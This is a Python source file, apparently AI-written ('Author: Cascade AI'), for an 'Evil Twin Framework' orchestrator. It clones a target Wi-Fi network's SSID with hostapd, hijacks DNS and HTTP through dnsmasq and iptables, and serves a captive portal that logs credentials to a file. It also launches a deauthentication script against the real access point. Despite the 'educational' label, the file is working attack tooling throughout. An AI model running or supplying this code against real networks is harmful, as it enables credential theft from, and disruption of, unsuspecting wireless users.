#!/usr/bin/env python3
"""
Evil Twin Framework - Core Orchestrator
Educational Security Testing Tool
Author: Cascade AI
"""

import subprocess
import sys
import signal
import os
import threading
import time
from pathlib import Path

# Configuration
SCRIPT_DIR = Path(__file__).parent.absolute()
CONFIG_DIR = SCRIPT_DIR / "config"
TEMPLATES_DIR = SCRIPT_DIR / "templates"
LOG_FILE = SCRIPT_DIR / "log.txt"

# Global process references
processes = {
    'hostapd': None,
    'dnsmasq': None,
    'flask': None,
    'deauther': None
}

# Target configuration
target_config = {
    'interface': 'wlan0mon',
    'target_bssid': '',
    'target_ssid': '',
    'target_channel': 1,
    'gateway_ip': '10.0.0.1',
    'dhcp_start': '10.0.0.10',
    'dhcp_end': '10.0.0.50'
}

################################################################################
# SIGNAL HANDLERS
################################################################################
def signal_handler(signum, frame):
    """Handle Ctrl+C for graceful cleanup"""
    print("\n[!] Interrupt detected. Cleaning up...")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

################################################################################
# CLEANUP FUNCTIONS
################################################################################
def cleanup():
    """Cleanup sequence to restore system stability"""
    print("[+] Killing hostapd...")
    kill_process('hostapd')
    
    print("[+] Killing dnsmasq...")
    kill_process('dnsmasq')
    
    print("[+] Killing Flask server...")
    kill_process('flask')
    
    print("[+] Killing deauther...")
    kill_process('deauther')
    
    print("[+] Flushing iptables rules...")
    flush_iptables()
    
    print("[+] Disabling IP forwarding...")
    disable_ip_forwarding()
    
    print("[+] Restarting NetworkManager...")
    restart_network_manager()
    
    print("[✓] Cleanup complete. Network restored.")

def kill_process(name):
    """Kill a process by name"""
    try:
        subprocess.run(['killall', name], stderr=subprocess.DEVNULL)
    except:
        pass

def flush_iptables():
    """Flush all iptables rules"""
    try:
        subprocess.run(['iptables', '-F'], stderr=subprocess.DEVNULL)
        subprocess.run(['iptables', '-t', 'nat', '-F'], stderr=subprocess.DEVNULL)
        subprocess.run(['iptables', '-X'], stderr=subprocess.DEVNULL)
        subprocess.run(['iptables', '-t', 'nat', '-X'], stderr=subprocess.DEVNULL)
    except:
        pass

def disable_ip_forwarding():
    """Disable IP forwarding"""
    try:
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], stderr=subprocess.DEVNULL)
    except:
        pass

def restart_network_manager():
    """Restart NetworkManager to restore network"""
    try:
        subprocess.run(['systemctl', 'restart', 'NetworkManager'], stderr=subprocess.DEVNULL)
    except:
        pass

################################################################################
# HARDWARE MANAGEMENT
################################################################################
def setup_interface(interface, channel):
    """Configure wireless interface on specific channel"""
    print(f"[+] Setting {interface} to channel {channel}...")
    try:
        subprocess.run(['iwconfig', interface, 'channel', str(channel)], check=True)
        print(f"[✓] Interface configured on channel {channel}")
    except subprocess.CalledProcessError as e:
        print(f"[✗] Failed to set channel: {e}")
        return False
    return True

def configure_ip(interface, ip):
    """Configure IP address on interface"""
    print(f"[+] Configuring IP {ip} on {interface}...")
    try:
        subprocess.run(['ip', 'addr', 'add', f'{ip}/24', 'dev', interface], check=True)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
        print(f"[✓] IP configured: {ip}")
    except subprocess.CalledProcessError as e:
        print(f"[✗] Failed to configure IP: {e}")
        return False
    return True

def enable_ip_forwarding():
    """Enable IP forwarding"""
    print("[+] Enabling IP forwarding...")
    try:
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
        print("[✓] IP forwarding enabled")
    except subprocess.CalledProcessError as e:
        print(f"[✗] Failed to enable IP forwarding: {e}")
        return False
    return True

def setup_iptables(gateway_ip):
    """Setup iptables rules for traffic redirection"""
    print("[+] Setting up iptables rules...")
    try:
        # NAT rule for internet forwarding (if needed)
        subprocess.run([
            'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 
            target_config['interface'].replace('mon', ''), '-j', 'MASQUERADE'
        ], stderr=subprocess.DEVNULL)
        
        # Redirect HTTP to Flask
        subprocess.run([
            'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i',
            target_config['interface'], '-p', 'tcp', '--dport', '80',
            '-j', 'DNAT', '--to-destination', f'{gateway_ip}:80'
        ], check=True)
        
        # Forward traffic
        subprocess.run([
            'iptables', '-A', 'FORWARD', '-i',
            target_config['interface'], '-j', 'ACCEPT'
        ], check=True)
        
        print("[✓] iptables rules configured")
    except subprocess.CalledProcessError as e:
        print(f"[✗] Failed to setup iptables: {e}")
        return False
    return True

################################################################################
# CONFIGURATION GENERATION
################################################################################
def generate_hostapd_config(ssid, interface, channel):
    """Generate hostapd.conf dynamically"""
    config_content = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
ieee80211n=1
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    config_path = CONFIG_DIR / "hostapd.conf"
    with open(config_path, 'w') as f:
        f.write(config_content)
    print(f"[✓] Generated hostapd.conf: {config_path}")
    return config_path

def generate_dnsmasq_config(gateway_ip, dhcp_start, dhcp_end):
    """Generate dnsmasq.conf dynamically"""
    config_content = f"""interface={target_config['interface']}
dhcp-range={dhcp_start},{dhcp_end},12h
dhcp-option=3,{gateway_ip}
dhcp-option=6,{gateway_ip}
server=8.8.8.8
log-queries
log-dhcp
address=/#/{gateway_ip}
"""
    config_path = CONFIG_DIR / "dnsmasq.conf"
    with open(config_path, 'w') as f:
        f.write(config_content)
    print(f"[✓] Generated dnsmasq.conf: {config_path}")
    return config_path

################################################################################
# PROCESS MANAGEMENT
################################################################################
def start_hostapd(config_path):
    """Start hostapd with generated config"""
    print("[+] Starting hostapd...")
    try:
        proc = subprocess.Popen(
            ['hostapd', str(config_path)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        processes['hostapd'] = proc
        print("[✓] hostapd started")
        time.sleep(2)
        return True
    except Exception as e:
        print(f"[✗] Failed to start hostapd: {e}")
        return False

def start_dnsmasq(config_path):
    """Start dnsmasq with generated config"""
    print("[+] Starting dnsmasq...")
    try:
        proc = subprocess.Popen(
            ['dnsmasq', '-C', str(config_path), '-d'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        processes['dnsmasq'] = proc
        print("[✓] dnsmasq started")
        time.sleep(2)
        return True
    except Exception as e:
        print(f"[✗] Failed to start dnsmasq: {e}")
        return False

def start_flask_server():
    """Start Flask captive portal"""
    print("[+] Starting Flask captive portal...")
    try:
        proc = subprocess.Popen(
            [sys.executable, str(SCRIPT_DIR / 'captive_portal.py')],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        processes['flask'] = proc
        print("[✓] Flask server started on port 80")
        time.sleep(2)
        return True
    except Exception as e:
        print(f"[✗] Failed to start Flask server: {e}")
        return False

def start_deauther(target_bssid, interface):
    """Start Scapy-based deauther"""
    print("[+] Starting deauther...")
    try:
        proc = subprocess.Popen(
            [sys.executable, str(SCRIPT_DIR / 'deauther.py'), 
             '--bssid', target_bssid, '--interface', interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        processes['deauther'] = proc
        print("[✓] Deauther started")
        return True
    except Exception as e:
        print(f"[✗] Failed to start deauther: {e}")
        return False

################################################################################
# MAIN ORCHESTRATOR
################################################################################
def print_banner():
    """Print tool banner"""
    print("""
    ███████╗██╗   ██╗███╗   ██╗ ██████╗ ██╗    ██╗
    ██╔════╝██║   ██║████╗  ██║██╔═══██╗██║    ██║
    █████╗  ██║   ██║██╔██╗ ██║██║   ██║██║ █╗ ██║
    ██╔══╝  ██║   ██║██║╚██╗██║██║   ██║██║███╗██║
    ██║     ╚██████╔╝██║ ╚████║╚██████╔╝╚███╔███╔╝
    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝  ╚══╝╚══╝ 
                    TWIN FRAMEWORK v2.0
        Educational Security Testing Tool
    """)

def get_target_info():
    """Get target AP information from user"""
    print("\n" + "="*50)
    print("TARGET CONFIGURATION")
    print("="*50)
    
    interface = input(f"[>] Wireless interface [{target_config['interface']}]: ") or target_config['interface']
    target_bssid = input("[>] Target BSSID (AP MAC): ").strip()
    target_ssid = input("[>] Target SSID: ").strip()
    channel = int(input(f"[>] Target channel [{target_config['target_channel']}]: ") or target_config['target_channel'])
    
    gateway_ip = input(f"[>] Gateway IP [{target_config['gateway_ip']}]: ") or target_config['gateway_ip']
    
    # Update config
    target_config.update({
        'interface': interface,
        'target_bssid': target_bssid,
        'target_ssid': target_ssid,
        'target_channel': channel,
        'gateway_ip': gateway_ip
    })
    
    print(f"\n[✓] Target configured:")
    print(f"    SSID: {target_ssid}")
    print(f"    BSSID: {target_bssid}")
    print(f"    Channel: {channel}")
    print(f"    Interface: {interface}")
    print(f"    Gateway IP: {gateway_ip}")

def main():
    """Main orchestrator function"""
    print_banner()
    
    # Create directories
    CONFIG_DIR.mkdir(exist_ok=True)
    TEMPLATES_DIR.mkdir(exist_ok=True)
    
    # Get target information
    get_target_info()
    
    # Validate input
    if not all([target_config['target_bssid'], target_config['target_ssid']]):
        print("[✗] Error: BSSID and SSID are required!")
        sys.exit(1)
    
    print("\n" + "="*50)
    print("INITIALIZING EVIL TWIN ATTACK")
    print("="*50)
    
    # Step 1: Setup interface
    if not setup_interface(target_config['interface'], target_config['target_channel']):
        sys.exit(1)
    
    # Step 2: Configure IP
    if not configure_ip(target_config['interface'], target_config['gateway_ip']):
        sys.exit(1)
    
    # Step 3: Enable IP forwarding
    if not enable_ip_forwarding():
        sys.exit(1)
    
    # Step 4: Setup iptables
    if not setup_iptables(target_config['gateway_ip']):
        sys.exit(1)
    
    # Step 5: Generate configs
    hostapd_conf = generate_hostapd_config(
        target_config['target_ssid'],
        target_config['interface'],
        target_config['target_channel']
    )
    dnsmasq_conf = generate_dnsmasq_config(
        target_config['gateway_ip'],
        target_config['dhcp_start'],
        target_config['dhcp_end']
    )
    
    # Step 6: Start services
    print("\n" + "="*50)
    print("STARTING SERVICES")
    print("="*50)
    
    if not start_hostapd(hostapd_conf):
        cleanup()
        sys.exit(1)
    
    if not start_dnsmasq(dnsmasq_conf):
        cleanup()
        sys.exit(1)
    
    if not start_flask_server():
        cleanup()
        sys.exit(1)
    
    if not start_deauther(target_config['target_bssid'], target_config['interface']):
        print("[!] Warning: Deauther failed to start. AP and portal still running.")
    
    print("\n" + "="*50)
    print("EVIL TWIN ATTACK RUNNING")
    print("="*50)
    print(f"[+] Fake AP: {target_config['target_ssid']}")
    print(f"[+] Captive Portal: http://{target_config['gateway_ip']}")
    print(f"[+] Credentials log: {LOG_FILE}")
    print("[+] Press Ctrl+C to stop and cleanup")
    print("="*50)
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup()

if __name__ == "__main__":
    # Check for root privileges
    if os.geteuid() != 0:
        print("[✗] Error: This script must be run as root!")
        print("[i] Run with: sudo python3 main.py")
        sys.exit(1)
    
    main()
